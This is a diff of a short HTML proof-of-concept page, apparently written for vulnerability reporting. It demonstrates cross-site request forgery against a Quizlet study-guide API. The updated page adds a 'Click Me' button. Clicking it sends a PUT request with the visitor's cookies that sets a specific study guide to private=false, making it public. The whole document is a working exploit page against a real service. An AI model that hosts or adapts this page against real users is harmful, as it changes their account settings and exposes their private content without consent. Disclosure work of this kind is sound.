@@ -1,15 +1,21 @@
 <html>
   <body>
     <h1>CSRF PoC: Make Study Guide Public</h1>
+    <button onclick="sendCSRF()">Click Me</button>
+
     <script>
-      fetch("https://quizlet.com/webapi/3.11/study-guides/42bacad3-83e0-4f6c-aab4-b52be6ffdb2f?private=true", {
-        method: "PUT",
-        credentials: "include"
-      }).then(res => {
-        console.log("Response status:", res.status);
-      }).catch(err => {
-        console.error("Request failed:", err);
-      });
+      function sendCSRF() {
+        fetch("https://quizlet.com/webapi/3.11/study-guides/42bacad3-83e0-4f6c-aab4-b52be6ffdb2f?private=false", {
+          method: "PUT",
+          credentials: "include"
+        })
+        .then(res => {
+          alert("Request sent! Status: " + res.status);
+        })
+        .catch(err => {
+          alert("Request failed: " + err);
+        });
+      }
     </script>
   </body>
 </html>
